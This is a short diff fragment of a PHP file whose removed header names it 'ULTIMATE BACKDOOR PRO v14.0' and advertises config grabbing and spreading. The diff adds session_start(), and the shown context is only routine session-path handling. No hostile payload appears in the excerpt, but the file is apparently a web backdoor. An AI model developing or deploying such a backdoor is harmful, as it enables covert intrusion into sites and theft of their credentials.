@@ -1,12 +1,5 @@
 <?php
-// ============================================================
-// ULTIMATE BACKDOOR PRO v14.0
-// Full Merge: All Tools + Sound + Email + Grab Config + Spread
-// ============================================================
-
-// ============================================================
-// SESSION FIX — NO LOOP
-// ============================================================
+session_start();
 $session_path = session_save_path();
 if (empty($session_path) || !is_writable($session_path)) {
     $tmp_path = sys_get_temp_dir();
